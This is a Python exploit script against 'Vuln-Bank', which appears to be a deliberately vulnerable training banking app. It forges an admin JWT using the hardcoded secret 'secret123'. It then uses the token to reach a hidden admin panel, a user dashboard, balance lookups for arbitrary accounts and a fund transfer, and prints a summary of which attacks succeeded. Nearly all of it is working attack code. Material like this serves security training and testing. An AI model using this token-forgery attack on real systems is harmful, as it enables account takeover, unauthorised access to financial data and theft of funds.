#!/usr/bin/env python3
"""
Hardcoded JWT Secret Key Exploit for Vuln-Bank

This script demonstrates a critical vulnerability in the JWT implementation of Vuln-Bank
where the application uses a hardcoded JWT secret key that is exposed in the source code,
allowing an attacker to forge valid tokens and impersonate any user, including administrators.

Usage:
    python3 hardcoded_jwt_secret_exploit.py [target_url]

Example:
    python3 hardcoded_jwt_secret_exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import jwt
from colorama import init, Fore, Style
import time
import base64

# Initialize colorama for colored output
init()

def forge_admin_token():
    """
    Forge a JWT token to impersonate an admin user
    
    Returns:
        str: Forged JWT token
    """
    print(f"{Fore.BLUE}[*] Forging admin JWT token with hardcoded secret...{Style.RESET_ALL}")
    
    # Create a payload claiming to be an admin
    payload = {
        'user_id': 1,  # Usually admin has ID 1
        'username': 'admin',
        'is_admin': True,
        'iat': int(time.time())  # Current time
    }
    
    # Using the known secret key with HS256 algorithm
    token = jwt.encode(payload, 'secret123', algorithm='HS256')
    print(f"{Fore.GREEN}[+] Successfully forged admin token: {token}{Style.RESET_ALL}")
    
    return token

def test_admin_access(base_url, token):
    """
    Test if we can access admin functionality with the forged token
    
    Args:
        base_url: The base URL of the vulnerable application
        token: Forged JWT token
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"\n{Fore.BLUE}[*] Testing admin access with forged token...{Style.RESET_ALL}")
    
    # Try to access the admin panel
    admin_url = f"{base_url}/sup3r_s3cr3t_admin"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        response = requests.get(admin_url, headers=headers)
        
        if response.status_code == 200:
            print(f"{Fore.RED}[-] Vulnerability confirmed! Successfully accessed admin panel with forged token.{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text[:100]}...{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.GREEN}[+] Admin access denied. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Response: {response.text}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[-] Error testing admin access: {str(e)}{Style.RESET_ALL}")
        return False

def test_user_impersonation(base_url, token):
    """
    Test if we can impersonate a user and access their data
    
    Args:
        base_url: The base URL of the vulnerable application
        token: Forged JWT token
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"\n{Fore.BLUE}[*] Testing user impersonation with forged token...{Style.RESET_ALL}")
    
    # Try to access the dashboard (which should be protected)
    dashboard_url = f"{base_url}/dashboard"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        response = requests.get(dashboard_url, headers=headers)
        
        if response.status_code == 200:
            print(f"{Fore.RED}[-] Vulnerability confirmed! Successfully impersonated user with forged token.{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text[:100]}...{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.GREEN}[+] User impersonation failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Response: {response.text}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[-] Error testing user impersonation: {str(e)}{Style.RESET_ALL}")
        return False

def test_balance_check(base_url, token):
    """
    Test if we can check any user's balance with the forged token
    
    Args:
        base_url: The base URL of the vulnerable application
        token: Forged JWT token
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"\n{Fore.BLUE}[*] Testing balance check with forged token...{Style.RESET_ALL}")
    
    # Try to check balance for account number
    balance_url = f"{base_url}/check_balance/12345"  # Any account number
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        response = requests.get(balance_url, headers=headers)
        
        if response.status_code == 200:
            print(f"{Fore.RED}[-] Vulnerability confirmed! Successfully checked balance with forged token.{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.GREEN}[+] Balance check failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Response: {response.text}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[-] Error testing balance check: {str(e)}{Style.RESET_ALL}")
        return False

def test_fund_transfer(base_url, token):
    """
    Test if we can transfer funds with the forged token
    
    Args:
        base_url: The base URL of the vulnerable application
        token: Forged JWT token
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"\n{Fore.BLUE}[*] Testing fund transfer with forged token...{Style.RESET_ALL}")
    
    # Try to transfer funds
    transfer_url = f"{base_url}/transfer"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    
    payload = {
        "to_account": "9876543210",  # Target account
        "amount": 100,  # Amount to transfer
        "description": "Testing hardcoded JWT secret vulnerability"
    }
    
    try:
        response = requests.post(transfer_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            print(f"{Fore.RED}[-] Vulnerability confirmed! Successfully transferred funds with forged token.{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.GREEN}[+] Fund transfer failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Response: {response.text}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[-] Error testing fund transfer: {str(e)}{Style.RESET_ALL}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Hardcoded JWT Secret Key Exploit for Vuln-Bank')
    parser.add_argument('target_url', nargs='?', default='http://localhost:5000', help='Target URL of the Vuln-Bank application')
    args = parser.parse_args()
    
    base_url = args.target_url.rstrip('/')
    
    print(f"{Fore.YELLOW}=== Vuln-Bank Hardcoded JWT Secret Key Exploit ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}[*] Target: {base_url}{Style.RESET_ALL}")
    
    # Forge an admin token
    token = forge_admin_token()
    
    # Test various functionalities with the forged token
    admin_access = test_admin_access(base_url, token)
    user_impersonation = test_user_impersonation(base_url, token)
    balance_check = test_balance_check(base_url, token)
    fund_transfer = test_fund_transfer(base_url, token)
    
    # Summary
    print(f"\n{Fore.YELLOW}=== Summary of Findings ==={Style.RESET_ALL}")
    if admin_access or user_impersonation or balance_check or fund_transfer:
        print(f"{Fore.RED}[-] Application is vulnerable to Hardcoded JWT Secret Key Attack{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] This is a critical vulnerability that allows attackers to forge tokens and impersonate any user{Style.RESET_ALL}")
        
        if admin_access:
            print(f"{Fore.RED}[-] Admin panel access: Vulnerable{Style.RESET_ALL}")
        if user_impersonation:
            print(f"{Fore.RED}[-] User impersonation: Vulnerable{Style.RESET_ALL}")
        if balance_check:
            print(f"{Fore.RED}[-] Balance check: Vulnerable{Style.RESET_ALL}")
        if fund_transfer:
            print(f"{Fore.RED}[-] Fund transfer: Vulnerable{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[+] Application is not vulnerable to Hardcoded JWT Secret Key Attack{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}[!] Hardcoded JWT Secret Key testing complete.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
